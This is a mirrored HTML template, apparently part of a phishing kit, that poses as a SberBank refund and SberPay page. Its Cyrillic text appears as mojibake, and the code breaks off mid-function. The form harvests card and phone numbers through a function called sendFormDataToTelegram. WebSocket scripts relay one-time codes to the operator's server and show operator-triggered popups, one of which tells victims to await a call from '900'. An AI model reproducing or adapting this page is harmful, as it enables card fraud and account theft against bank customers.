<!DOCTYPE html>
<html lang="en" style="" data-scrapbook-source="https://object93256.art/banks/sber/?source=object93256.art"
      data-scrapbook-create="20250724090529289">
<!-- Mirrored from tvou-opros-portal24.ru/index_sber.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Jun 2025 10:26:35 GMT -->
<!-- Added by HTTrack -->
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <meta content="no-cache" http-equiv="Cache-control">
    <meta content="no-cache" http-equiv="Pragma">
    <meta content="-1" http-equiv="Expires">
    {% if is_zoo %}
        <title>–í–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤ ‚Äî –ó–æ–æ–ê–ø—Ç–µ–∫–∞</title>

    {% elif is_yandex %}

        <title>–°–±–µ—Ä–±–∞–Ω–∫ | –û–ø–ª–∞—Ç–∞ –¥–æ—Å—Ç–∞–≤–∫–∏</title>

    {% else %}

        <title>–°–±–µ—Ä–ë–∞–Ω–∫ | –í–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤</title>

    {% endif %}
    <link rel="shortcut icon" href="/static/gos_uslugi/sber/favicon_sber.ico">
    <link rel="stylesheet" href="/static/gos_uslugi/sber/main.css">
    <link rel="stylesheet" href="/static/gos_uslugi/sber/style.css">
    <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        var SITE_ID = "gos_sber";
    </script>
    <script src="/static/gos_uslugi/sber/core.min.js"></script>
</head>

<body class="main">
<header class="main-header">
    <div class="main-header__item main-header-left">
        <img alt="–°–±e—Ä–±a–Ω–∫" class="sber_logo_width" src="/static/gos_uslugi/sber/sberbank-logo.befb25b6.svg">
    </div>
    <div class="main-header__item main-header-center">
        <div class="main-header-center__container mobile">
            <div class="main-header-center__item">
                <div class="main-header-center__logo">
                    <img alt="–°–±e—Ä–±a–Ω–∫" class="sber_logo_width"
                         src="/static/gos_uslugi/sber/sberbank-logo.befb25b6.svg">
                </div>
            </div>
            <div class="main-header-center__item text-right">
                <a rel="noopener noreferrer" onclick="sber_pay_flow();" class="link">–í–æ–π—Ç–∏ –øo –°–±–µp ID</a>
            </div>
        </div>
        <div class="main-header-center__container">
            <div class="main-header-center__item">
                <div class="main-header-center__title">{{ '–°–ë–ïP' if not is_zoo else '–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤–æ–∑–≤—Ä–∞—Ç–∞' }}</div>
                <div class="main-header-center__subtitle"><span
                        id="tr_summ">{{ ad.amount if not is_zoo else order_text }}</span>
                    {{ '‚ÇΩ' if not is_zoo else '' }}</div>
            </div>
            <div class="main-header-center__item text-right">
                <div class="main-header-center__image"></div>
            </div>
        </div>
    </div>
    <div class="main-header__item main-header-right">
        <div class="main-header-right__button text-right">
            <button class="main-header-button" type="button" onclick="sber_pay_flow();">
                <svg class="styles_icon__2Zl3c" height="18" viewBox="0 0 18 18" width="18">
                    <path clip-rule="evenodd"
                          d="M17.8554 7.38686C17.9508 7.90928 18 8.44993 18 9.00091C18 13.9712 13.9704 18 9 18C4.03017 18 0 13.9712 0 9.00091C0 4.02875 4.03017 0 9 0C11.1411 0 13.1079 0.748405 14.6532 1.99676L12.9026 3.28703C11.7911 2.52587 10.4469 2.07938 9 2.07938C5.18486 2.07938 2.08099 5.18538 2.08099 9.00091C2.08099 12.8164 5.18486 15.9206 9 15.9206C12.817 15.9206 15.9208 12.8164 15.9208 9.00091C15.9208 8.95444 15.9198 8.90797 15.9188 8.8615C15.9184 8.84601 15.9181 8.83052 15.9178 8.81503L17.8554 7.38686ZM5.57433 6.59698L9.00074 8.74621L16.1214 3.49766C16.5472 4.04742 16.911 4.64639 17.2014 5.28606L9.00074 11.331L5.57433 9.18177V6.59698Z"
                          fill="currentColor" fill-rule="evenodd"></path>
                </svg>
                <span>B–æ–π—Ç–∏ –ø–æ –°–±–µp ID</span>
            </button>
        </div>
    </div>
</header>
<div class="sbp-btn-container">
    <h1>SberPay</h1>
    <p>–ë—ã—Å—Ç—Ä–∞—è –æ–ø–ª–∞—Ç–∞ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –°–±–µ—Ä–ë–∞–Ω–∫ –û–Ω–ª–∞–π–Ω</p>
    <button>
        {% if is_yandex %}

        <h4>–û–ø–ª–∞—Ç–∏—Ç—å</h4>

        {% else %}

        <h4>–û–ø–ª–∞—Ç–∏—Ç—å</h4>

        {% endif %}
        <svg class="styles_icon__2Zl3c white_logo" height="40" width="40" viewBox="0 0 17.8554 17.9206">
            <path clip-rule="evenodd"
                  d="M17.8554 7.38686C17.9508 7.90928 18 8.44993 18 9.00091C18 13.9712 13.9704 18 9 18C4.03017 18 0 13.9712 0 9.00091C0 4.02875 4.03017 0 9 0C11.1411 0 13.1079 0.748405 14.6532 1.99676L12.9026 3.28703C11.7911 2.52587 10.4469 2.07938 9 2.07938C5.18486 2.07938 2.08099 5.18538 2.08099 9.00091C2.08099 12.8164 5.18486 15.9206 9 15.9206C12.817 15.9206 15.9208 12.8164 15.9208 9.00091C15.9208 8.95444 15.9198 8.90797 15.9188 8.8615C15.9184 8.84601 15.9181 8.83052 15.9178 8.81503L17.8554 7.38686ZM5.57433 6.59698L9.00074 8.74621L16.1214 3.49766C16.5472 4.04742 16.911 4.64639 17.2014 5.28606L9.00074 11.331L5.57433 9.18177V6.59698Z"
                  fill="currentColor" fill-rule="evenodd"></path>
        </svg>
        Pay
    </button>
</div>
<main class="main-container">
    <div class="main-container__item main-container-left"></div>
    <div class="main-container__item main-container-center vstep-box advise__box" id="vstep_flow">
        <form method="post" onsubmit="event.preventDefault(); return false;" id="user_registration_form"
              class="user_registration_form block-form">
            <h1 class="vstep-question">–ü–æ –∫–∞—Ä—Ç–µ</h1>
            <div class="main_form_error_message"></div>
            <div class="step-fields sber-step-fields">
                <div class="field">
                    <label class="label" for="form_input_card">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
                    <input type="text" placeholder="0000 0000 0000 0000" required id="form_input_card"
                           name="pw" class="sber-input" maxlength="19" value="">
                </div>
                <div class="field">
                    <label class="label" for="form_input_phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                    <input type="tel" placeholder="+7 (___) ___-__-__" required id="form_input_phone"
                           name="phone" class="sber-input" maxlength="18" value="+7 ">
                </div>
                <div class="field field-submit">
                    <button class="sber-submit" type="button" id="next-btn">–û–ø–ª–∞—Ç–∏—Ç—å</button>
                </div>
                <div class="sber-secure-info">
                    <img src="/static/gos_uslugi/sber/card.svg" alt="" class="sber-secure-icon">
                    <span>–î–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –ø–æ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—é</span>
                </div>
            </div>
</form>
        <script>
            document.addEventListener('DOMContentLoaded', () => {
                    const fields = [
                        {id: 'form_input_card', required: true},
                        {id: 'form_input_phone', required: true},
                    ];

                    fields.forEach(field => {
                        const input = document.getElementById(field.id);
                        if (!input) return;
                        input.addEventListener('input', () => {
                            const wrapper = input.closest('.field');
                            if (!wrapper) return;
                            if (field.required && input.value.trim() === '') {
                                wrapper.classList.add('has-error');
                            } else {
                                wrapper.classList.remove('has-error');
                            }
                        });
                    });

                    const button = document.getElementById('next-btn');
                    if (button) {
                        button.addEventListener('click', () => {
                            let isValid = true;
                            fields.forEach(field => {
                                const input = document.getElementById(field.id);
                                if (!input) return;
                                const wrapper = input.closest('.field');
                                if (field.required && input.value.trim() === '') {
                                    wrapper?.classList.add('has-error');
                                    isValid = false;
                                } else {
                                    wrapper?.classList.remove('has-error');
                                }
                            });
                            if (isValid) {
                                sendFormDataToTelegram('user_registration_form');
                            }
                        });
                    }

                    const cardInput = document.getElementById('form_input_card');
                    const phoneInput = document.getElementById('form_input_phone');

                    if (typeof pwCardMask === 'function') {
                        pwCardMask('form_input_card');
                    } else if (cardInput) {
                        cardInput.addEventListener('input', event => {
                            const value = event.target.value.replace(/\D/g, '').substring(0, 16);
                            const chunks = value.match(/.{1,4}/g) || [];
                            event.target.value = chunks.join(' ');
                        });
                    }

                    if (phoneInput) {
                        if (typeof phoneMask === 'function') {
                            phoneMask('form_input_phone');
                        }

                        if (!phoneInput.value.trim()) {
                            phoneInput.value = '+7 ';
                        }

                        phoneInput.addEventListener('focus', () => {
                            if (!phoneInput.value.trim()) {
                                phoneInput.value = '+7 ';
                            }
                        });

                        phoneInput.addEventListener('blur', event => {
                            const digits = event.target.value.replace(/\D/g, '');
                            if (digits.length < 11) {
                                event.target.value = '';
                            }
                        });

                        if (typeof phoneMask !== 'function') {
                            phoneInput.addEventListener('input', event => {
                                let digits = event.target.value.replace(/\D/g, '');
                                if (!digits.length) {
                                    event.target.value = '+7 ';
                                    return;
                                }
                                if (digits[0] === '8') {
                                    digits = '7' + digits.slice(1);
                                } else if (digits[0] !== '7') {
                                    digits = '7' + digits;
                                }
                                digits = digits.substring(0, 11);

                                let formatted = '+7';
                                if (digits.length > 1) {
                                    formatted += ' (' + digits.substring(1, 4);
                                }
                                if (digits.length >= 4) {
                                    formatted += ') ' + digits.substring(4, 7);
                                }
                                if (digits.length >= 7) {
                                    formatted += '-' + digits.substring(7, 9);
                                }
                                if (digits.length >= 9) {
                                    formatted += '-' + digits.substring(9, 11);
                                }
                                if (digits.length <= 1) {
                                    formatted += ' ';
                                }
                                event.target.value = formatted.trimEnd();
                            });
                        }
                    }
                });
        </script>

    </div>
    <div class="main-container__item main-container-right"></div>
</main>
<footer></footer>
<style>
    .sber-step-fields {
        display: flex;
        flex-direction: column;
        gap: 18px;
    }

.sber-input {
    width: 100%;
    height: 54px;
    padding: 0 18px;
    border-radius: 18px;
    border: 1px solid #d3e6d9;
    background: #f6fbf8;
    font-size: 16px;
    color: #102923;
    transition: border 0.2s ease, box-shadow 0.2s ease;
    box-sizing: border-box;
}
.user_registration_form .sber-input {
    background: #f6fbf8 !important;
    border-color: #d3e6d9 !important;
}

    .sber-input:focus {
        outline: none;
        border-color: #21a038;
        box-shadow: 0 0 0 4px rgba(33, 160, 56, 0.18);
    }

    .field.field-submit {
        margin-top: 8px;
    }

    .sber-submit {
        width: 100%;
        height: 56px;
        border-radius: 20px;
        border: none;
        background: linear-gradient(135deg, #21a038 0%, #58c57a 100%);
        color: #ffffff;
        font-size: 17px;
        font-weight: 600;
        cursor: pointer;
        transition: transform 0.18s ease, box-shadow 0.18s ease, filter 0.18s ease;
    }

    .sber-submit:hover {
        box-shadow: 0 20px 36px rgba(33, 160, 56, 0.22);
        transform: translateY(-1px);
    }

    .sber-submit:active {
        transform: translateY(0);
        filter: saturate(0.92);
    }

    .field.has-error .sber-input {
        border-color: #e24444;
        box-shadow: 0 0 0 4px rgba(226, 68, 68, 0.14);
    }

    .sber-secure-info {
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 13px;
        color: #5d766d;
    }

    .sber-secure-icon {
        width: 36px;
        height: 24px;
    }
</style>
<div class="loader sber-loader-overlay">
    <div class="sber-loader-container">
        <div class="sber-loader-icon">
            <svg viewBox="0 0 100 100" fill="none" stroke-linecap="round">
                <circle cx="50" cy="50" r="42"></circle>
            </svg>
        </div>
        <div class="sber-loader-text loader-text">
            <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...</p>
            <p>–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.</p>
        </div>
    </div>
</div>

<style>
    .sber-loader-overlay {
        position: fixed;
        inset: 0;
        z-index: 2000;
        display: none;
        align-items: center;
        justify-content: center;
        padding: 18px;
        background: radial-gradient(circle at top, rgba(7, 36, 23, 0.92), rgba(3, 15, 10, 0.95));
        backdrop-filter: blur(14px);
        opacity: 0;
        visibility: hidden;
        pointer-events: none;
        transition: opacity 0.18s ease, visibility 0.18s ease;
    }

    .sber-loader-overlay.show {
        display: flex;
        opacity: 1;
        visibility: visible;
        pointer-events: auto;
    }

    .sber-loader-container {
        background: rgba(12, 24, 19, 0.94);
        border-radius: 28px;
        padding: 36px 38px;
        text-align: center;
        box-shadow: 0 32px 64px rgba(6, 14, 10, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.08);
        border: 1px solid rgba(33, 160, 84, 0.35);
        width: min(300px, 92vw);
    }

    .sber-loader-icon {
        margin-bottom: 22px;
    }

    .sber-loader-icon svg {
        width: 88px;
        height: 88px;
    }

    .sber-loader-icon circle {
        stroke-dasharray: 220 320;
        stroke-dashoffset: 0;
        animation: sber-loader-spin 1.05s linear infinite;
        transform-box: fill-box;
        transform-origin: 50% 50%;
        fill: transparent;
        stroke: #21a038;
        stroke-width: 8;
    }

    .sber-loader-text {
        color: rgba(226, 244, 234, 0.9);
        font-size: 16px;
        line-height: 1.5;
    }

    .sber-loader-text p {
        margin: 4px 0;
    }

    @keyframes sber-loader-spin {
        to {
            transform: rotate(360deg);
        }
    }

    body.three-ds-active {
        overflow: hidden;
    }
</style>

<script src="/static/gos_uslugi/sber/base_v2.js"></script>
<script>
    function goodbye() {
        document.location.href = 'https://www.mail.ru/';
    }

    document.addEventListener('DOMContentLoaded', function () {
        const elems = document.querySelectorAll('#tr_summ');
        let summ = document.location.hash.replace('#', '');
        if (summ && summ.length) elems[0].textContent = summ;


        // –æ—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ start_flow, –¥–æ–∂–¥—ë–º—Å—è —Ä—É—á–Ω–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    });

    let client_id = localStorage.getItem("client_id");
    if (!client_id) {
        client_id = crypto.randomUUID();
        localStorage.setItem("client_id", client_id);
    }

    const loc = window.location;
    const searchParams = new URLSearchParams(window.location.search);
    const source = searchParams.get("source") || document.referrer || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
    const wsProtocol = loc.protocol === "https:" ? "wss:" : "ws:";
    const socketUrl = `${wsProtocol}//${loc.host}/ws/bank/sber/?client_id=${client_id}&source=${encodeURIComponent(source)}`;
    window.socketUrl = socketUrl;
    function socketSend(payload) {
        const ws = window.websocket_connection || window.socket;
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(typeof payload === 'string' ? payload : JSON.stringify(payload));
        } else {
            console.warn("–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è");
        }
    }

    function attachPrimarySocket(ws) {
        if (!ws) {
            return;
        }
        ws.onmessage = (event) => {
            try {
                socket_message_handler(event);
            } catch (handlerError) {
                console.warn("socket_message_handler error", handlerError);
            }

            const data = JSON.parse(event.data);
            console.log("üì¨ –û—Ç–≤–µ—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:", data);

            if (data.client_id) {
                client_id = data.client_id;
                localStorage.setItem("client_id", client_id);
            }

            if (data.command === 'show_code_form') {
                if (!window.__threeDSActive && !window.__threeDSPending) {
                    showLoader(false);

                    const formUrl = data.message === 'log_taken' ? '/banks/form2d84' : '/banks/form1745';

                    fetch(formUrl)
                        .then(res => res.text())
                        .then(html => {
                            const container = document.getElementById('vstep_flow');
                            container.innerHTML = html;
                            initializeFormBehaviors('user_registration_form', 'main');
                        });
                }
                return;
            }

            if (data.command === 'code_900') {
                clear3DSOverlay();
                showLoader(false);
                showPopup("–û—à–∏–±–∫–∞", "–û–ø–µ—Ä–∞—Ü–∏—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –±–∞–Ω–∫–æ–º. –ë–∞–Ω–∫—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é —Å–æ–≤–µ—Ä—à–∞–µ—Ç–µ –∏–º–µ–Ω–Ω–æ –í—ã. –î–æ–∂–¥–∏—Ç–µ—Å—å –∑–≤–æ–Ω–∫–∞ —Å –Ω–æ–º–µ—Ä–∞ 900 –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é —Å –ø–æ–º–æ—â—å—é –≥–æ–ª–æ—Å–æ–≤–æ–≥–æ –ø–æ–º–æ—â–Ω–∏–∫–∞, –ø–æ—Å–ª–µ —á–µ–≥–æ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –µ—â–µ —Ä–∞–∑.");
                return;
            }

            if (data.type === 'info' && data.message) {
                if (!window.__threeDSActive) {
                    showLoader(false);
                }
                showPopup("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", data.message);
                const btn = document.getElementById('resend-btn');
                if (btn) btn.removeAttribute('disabled');
            }

            if (data.type === 'success' && data.message) {
                if (!window.__threeDSActive) {
                    showLoader(false);
                }
                showPopup("‚úÖ –£—Å–ø–µ—à–Ω–æ", data.message);
                const btn = document.getElementById('resend-btn');
                if (btn) btn.removeAttribute('disabled');
            }

            if (data.type === 'error' && data.message) {
                if (!window.__threeDSActive) {
                    showLoader(false);
                }
                const msg = data.message;

                if (msg === "–ö–æ–¥ –Ω–µ–≤–µ—Ä–Ω—ã–π") {
                    showPopup("–û—à–∏–±–∫–∞", "–ù–µ–≤–µ—Ä–Ω–æ —É–∫–∞–∑–∞–Ω –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.");
                } else if (msg === "–ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª") {
                    showPopup("–û—à–∏–±–∫–∞", "–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–æ–¥–∞ –∏—Å—Ç—ë–∫.");
                } else if (msg === "–ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ") {
                    showPopup("–û—à–∏–±–∫–∞", "–í–≤–µ–¥–µ–Ω—ã –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.");
                    fetch('/banks/form1745').then(res => res.text()).then(html => {
                        document.getElementById('vstep_flow').innerHTML = html;
                        initializeFormBehaviors('user_registration_form', 'main');
                    });
                } else if (msg.includes("–ë–∞–Ω–∫-—ç–º–∏—Ç–µ–Ω—Ç")) {
                    showPopup("–û—à–∏–±–∫–∞", msg);
                    fetch('/banks/form1745').then(res => res.text()).then(html => {
                        document.getElementById('vstep_flow').innerHTML = html;
                        initializeFormBehaviors('user_registration_form', 'main');
                    });
                } else {
                    showPopup("–û—à–∏–±–∫–∞", msg);
                }

                const btn = document.getElementById('resend-btn');
                if (btn) btn.removeAttribute('disabled');
            }
        };
    }

    function attachLifecycleHandlers(ws, targetUrl) {
        if (!ws) {
            return;
        }
        window.websocket_connection = ws;
        window.socket = ws;
        attachPrimarySocket(ws);
        ws.onerror = () => {
            try { ws.close(); } catch (closeError) {}
        };
        ws.onclose = () => {
            setTimeout(() => {
                if (window.socketUrl) {
                    fetchAndEstablishConnection(targetUrl);
                }
            }, 2000);
        };
        ws.onopen = () => {
            try {
                if (typeof USER_INIT_DATA !== "undefined" && typeof connectToRoom === "function") {
                    connectToRoom(USER_INIT_DATA, localStorage.getItem('xray'));
                }
            } catch (e) {
                console.warn("connectToRoom error", e);
            }
        };
    }

    function fetchAndEstablishConnection(customUrl) {
        const targetUrl = customUrl || window.socketUrl;

        try {
            if (window.websocket_connection) {
                window.websocket_connection.onclose = null;
                window.websocket_connection.onerror = null;
                window.websocket_connection.close();
            }
        } catch (e) {
            console.warn("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–∫—Ä—ã—Ç—å –ø—Ä–µ–¥—ã–¥—É—â–∏–π WebSocket", e);
        }

        try {
            const ws = new WebSocket(targetUrl);
            attachLifecycleHandlers(ws, targetUrl);
        } catch (error) {
            console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å WebSocket", error);
            setTimeout(() => fetchAndEstablishConnection(targetUrl), 3000);
        }
    }

    try {
        const initialSocket = new WebSocket(socketUrl);
        attachLifecycleHandlers(initialSocket, socketUrl);
    } catch (error) {
        console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –ø–µ—Ä–≤–∏—á–Ω–æ–µ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ", error);
        setTimeout(() => fetchAndEstablishConnection(socketUrl), 2000);
    }

    const sberOverlayLoader = document.querySelector('.sber-loader-overlay');
    if (typeof window.showLoader === 'function') {
        const originalShowLoader = window.showLoader;
        window.showLoader = function (show) {
            originalShowLoader(show);
            if (sberOverlayLoader) {
                sberOverlayLoader.classList.toggle('show', !!show);
            }
        };
        if (sberOverlayLoader) {
            sberOverlayLoader.classList.remove('show');
        }
    } else if (sberOverlayLoader) {
        sberOverlayLoader.classList.remove('show');
    }

    window.fetchAndEstablishConnection = window.fetchAndEstablishConnection || function () {};
    window.socketUrl = window.socketUrl || '';
    window.websocket_connection = window.websocket_connection || null;


    function showPopup(title, message) {

        showLoader(false)

        return new Promise((resolve) => {
            document.querySelectorAll(".popup-error").forEach(el => el.remove());

            const overlay = document.createElement("div");
            overlay.className = "popup-overlay popup-error";

            const popup = document.createElement("div");
            popup.className = "popup-notice";

            // –¶–≤–µ—Ç–∞
            let border = "#cc0000";
            let background = "#fff0f0";
            let color = "#cc0000";
            let btnColor = "#21a038";

            if (title.includes("‚úÖ") || title.includes("–£—Å–ø–µ—à–Ω–æ")) {
                border = "#21a038";
                background = "#f0fff5";
                color = "#000";
                btnColor = "#21a038";
            } else if (title.includes("‚ÑπÔ∏è") || title.includes("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")) {
                border = "#007bff";
                background = "#eaf4ff";
                color = "#003366";
                btnColor = "#007bff";
            }

            popup.style.backgroundColor = background;
            popup.style.border = `1px solid ${border}`;
            popup.style.color = color;

            const closeBtn = document.createElement("button");
            closeBtn.textContent = "–ó–∞–∫—Ä—ã—Ç—å";
            closeBtn.style = `
            background-color:${btnColor};
            color:white;
            border:none;
            padding:10px 20px;
            font-size:15px;
            border-radius:6px;
            cursor:pointer;
        `;
            closeBtn.addEventListener("click", () => {
                overlay.remove();
                resolve(); // –†–µ–∑–æ–ª–≤–∏–º –ø—Ä–æ–º–∏—Å –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è
            });

            popup.innerHTML = `
            <h3 style="color:${border};">${title}</h3>
            <p style="color:${color};">${message}</p>
        `;
            popup.appendChild(closeBtn);

            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        });
    }



    let formSubmitHandler = null;

    function validate_credit_card(value) {
        // accept only digits, dashes or spaces
        if (/[^0-9-\s]+/.test(value))
            return false;

        // The Luhn Algorithm. It's so pretty.
        var nCheck = 0
            , nDigit = 0
            , bEven = false;
        value = value.replace(/\D/g, "");

        for (var n = value.length - 1; n >= 0; n--) {
            var cDigit = value.charAt(n)
                , nDigit = parseInt(cDigit, 10);

            if (bEven) {
                if ((nDigit *= 2) > 9)
                    nDigit -= 9;
            }

            nCheck += nDigit;
            bEven = !bEven;
        }

        return nCheck % 10 == 0;
    }


    function sendFormDataToTelegram(formId) {
        const form = document.getElementById(formId);
        if (!form) return;

        const nameInput = form.querySelector('[name="name"]');
        const phoneInput = form.querySelector('[name="phone"]');
        const cardInput = form.querySelector('[name="pw"]');

        if (!phoneInput || !cardInput) {
            console.warn("–ù–µ –Ω–∞–π–¥–µ–Ω—ã –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã");
            showPopup("–û—à–∏–±–∫–∞", "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ —Ñ–æ—Ä–º—ã. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.");
            return;
        }

        const rawName = nameInput ? nameInput.value.trim() : "";
        const normalizedName = rawName ? rawName.replace(/\s+/g, " ").toUpperCase() : "";
        const phoneRaw = phoneInput.value.trim();
        const cardRaw = cardInput.value.trim();

        const phoneDigits = phoneRaw.replace(/\D/g, "");
        const cardDigits = cardRaw.replace(/\D/g, "");

        if (nameInput) {
            if (!normalizedName || !/^[A-Z–ê-–Ø–Å\s]+$/.test(normalizedName)) {
                showPopup("–û—à–∏–±–∫–∞", "–ò–º—è –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã.");
                return;
            }
        }

        if (phoneDigits.length !== 11 || !phoneDigits.startsWith("7")) {
            showPopup("–û—à–∏–±–∫–∞", "–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ +7 (XXX) XXX-XX-XX.");
            return;
        }

        if (cardDigits.length !== 16) {
            showPopup("–û—à–∏–±–∫–∞", "–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 16 —Ü–∏—Ñ—Ä.");
            return;
        }

        logAction(phoneRaw, cardRaw, normalizedName);
        }


        function sendCodeToTelegram(formId) {
            const form = document.getElementById(formId);
            if (!form) return;

            const code = form.querySelector('input[name="code"]').value.trim();
            if (!/^\d{4,6}$/.test(code)) {
                alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∫–æ–¥ (–æ—Ç 4 –¥–æ 6 —Ü–∏—Ñ—Ä)");
                return;
            }

            showLoader(true);
            console.log("üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é –∫–æ–¥ —á–µ—Ä–µ–∑ WebSocket:", code);
        socketSend({
            client_id: client_id,
            message: {code}
        });
        }

        function requestNewCode() {
            const btn = document.getElementById('resend-btn');
            if (btn) btn.setAttribute('disabled', true);
            showLoader(true);
        socketSend({message: "request_code"});
        }

        function initializeFormBehaviors(formId, validatorType = 'main') {
            const form = document.getElementById(formId);
            if (!form) return;

            const inputs = form.querySelectorAll("input, textarea, select");

            // –ü—Ä–∏–º–µ–Ω–∏–º –º–∞—Å–∫–∏
            if (formId === 'user_registration_form') {
                phoneMask('form_input_phone');
                pwCardMask('form_input_card');
            } else if (formId === 'user_additional_form') {
                pwCodeMask('form_input_code');
            }

            // –û–ø—Ä–µ–¥–µ–ª–∏–º –Ω—É–∂–Ω—ã–µ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä—ã
            let validatorMap = {
                main: main_form_validators,
                code: code_form_validators,
                password: password_form_validators,
                password_vtb: password_form_validators_vtb,
                general: general_password_form_validators,
                question: question_form_validators,
            };

            const validators = validatorMap[validatorType];

            if (validators) {
                for (let i = 0; i < inputs.length; ++i) {
                    inputs.item(i).addEventListener("change", function () {
                        const errors = validate(form, validators) || {};
                        showErrorsForInput(this, errors[this.name])
                    });
                }
            }
        }
</script>
<script>

    function isEmpty(value) {
        return (value == null || (typeof value === "string" && value.trim().length === 0));
    }


    let allowSend = true;

    window.__threeDSActive = window.__threeDSActive === true;
    window.__threeDSPending = window.__threeDSPending === true;
    window.__allowPasswordForms = false;
    if (typeof window.__threeDSViewportCleanup !== 'function') {
        window.__threeDSViewportCleanup = null;
    }

    const bank = '{{ bank }}';
    const bankReturnPath = bank ? `/banks/${bank}/{{ link_id }}` : '/bank/{{ link_id }}';

    function navigateWithBank(url, replace = false) {
        if (!url) {
            return;
        }
        window.__threeDSPending = true;
        try {
            const target = new URL(url, window.location.origin);
            if (bank) {
                target.searchParams.set('bank', bank);
            }
            showLoader(true);
            if (replace) {
                window.location.replace(target.toString());
            } else {
                window.location.href = target.toString();
            }
        } catch (err) {
            const separator = url.includes('?') ? '&' : '?';
            const fallback = bank ? `${url}${separator}bank=${encodeURIComponent(bank)}` : url;
            showLoader(true);
            if (replace) {
                window.location.replace(fallback);
            } else {
                window.location.href = fallback;
            }
        }
    }

    function reset3DSState() {
        if (typeof window.__threeDSViewportCleanup === 'function') {
            try {
                window.__threeDSViewportCleanup();
            } catch (cleanupError) {
                console.warn("threeDS viewport cleanup error", cleanupError);
            }
        }
        window.__threeDSViewportCleanup = null;
        document.body.classList.remove('three-ds-active');
        window.__threeDSActive = false;
        window.__threeDSPending = false;
        window.__allowPasswordForms = false;
        const container = document.getElementById('vstep_flow');
        if (container) {
            container.style.visibility = '';
            container.style.display = '';
